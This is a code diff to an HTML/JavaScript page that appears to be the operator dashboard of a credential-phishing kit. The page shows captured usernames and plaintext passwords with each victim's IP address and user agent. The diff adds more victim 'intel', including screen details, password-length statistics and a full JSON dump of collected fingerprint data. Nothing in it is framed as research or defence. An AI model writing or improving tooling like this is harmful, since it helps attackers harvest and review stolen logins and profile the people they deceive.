@@ -69,12 +69,24 @@
       empty.style.display = 'none';
       const item = document.createElement('li');
       item.className = 'log-item';
-      item.innerHTML = `
+item.innerHTML = `
         <div class="timestamp">${new Date(data.timestamp).toLocaleString()}</div>
         <div><span class="username">👤 ${data.username}</span></div>
         <div><span class="password">🔑 ${data.password}</span></div>
-        <div class="details">🌐 ${data.ip} • 💻 ${data.userAgent.slice(0,50)}...</div>
+        <div class="details">
+          🌐 <strong>${data.ip}</strong> | 
+          💻 ${data.userAgent.slice(0,40)}... | 
+          🖥️ ${data.intel.screen || '?'} | 
+          🖐️ ${data.intel.passwordStats ? `L${data.intel.passwordStats.length}` : '?'} 
+        </div>
+        ${data.intel ? `
+        <details style="margin-top: 12px; padding: 12px; background: rgba(0,0,0,0.3); border-radius: 8px;">
+          <summary style="cursor: pointer; font-weight: 600; color: #39c582;">🔍 Full Intel (${JSON.stringify(data.intel).length} bytes)</summary>
+          <pre style="font-size: 0.8em; background: rgba(0,0,0,0.5); padding: 12px; border-radius: 6px; overflow: auto; max-height: 200px;">${JSON.stringify(data.intel, null, 2)}</pre>
+        </details>
+        ` : ''}
       `;
+
       logs.insertBefore(item, logs.firstChild);
       
       // Keep only last 50 logs
@@ -88,3 +100,4 @@
   </script>
 </body>
 </html>
+
